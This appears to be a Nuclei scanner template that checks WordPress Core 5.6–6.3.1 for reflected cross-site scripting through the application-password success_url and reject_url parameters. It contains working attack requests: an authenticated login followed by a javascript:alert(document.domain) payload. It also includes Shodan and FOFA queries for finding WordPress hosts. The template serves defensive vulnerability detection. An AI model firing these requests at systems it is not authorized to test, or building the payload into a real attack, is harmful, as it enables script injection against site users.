http:
- matchers:
  - dsl:
    - contains(body, "/wp-content/plugins")
    internal: true
    type: dsl
  raw:
  - 'GET /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains(body_2, "javascript:alert(document.domain)")
    - contains(content_type_2, "text/html")
    - status_code_2 == 200
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/authorize-application.php?success_url=javascript%3Aalert%28document.domain%29&reject_url=javascript%3Aalert%28document.domain%29
    HTTP/1.1

    Host: {{Hostname}}

    '
id: application-pass-xss
info:
  author: nqdung2002
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: 'WordPress Core is vulnerable to Reflected Cross-Site Scripting via
    the ''success_url'' and ''reject_url'' parameters when requesting application
    passwords in versions between 5.6 and 6.3.1 due to insufficient input sanitization
    and output escaping of pseudo protocol URIs.

    '
  impact: 'This makes it possible for unauthenticated attackers to inject arbitrary
    web scripts in pages that execute if they can successfully trick a user into performing
    an action such as clicking on a link and accepting or rejecting the application
    password.

    '
  metadata:
    fofa-query: body="oembed" && body="wp-"
    framework: wordpress
    max-request: 3
    product: wordpress
    shodan-query:
    - cpe:"cpe:2.3:a:wordpress:wordpress"
    - http.component:"wordpress"
    vendor: wordpress
  name: WordPress Core 5.6 and 6.3.1 - Cross-Site Scripting
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-56-631-reflected-cross-site-scripting-via-application-password-requests?asset_slug=wordpress
  - https://wpscan.com/vulnerability/da1419cc-d821-42d6-b648-bdb3c70d91f2/
  severity: medium
  tags: wpscan,wp,wordpress,authenticated,xss,vuln
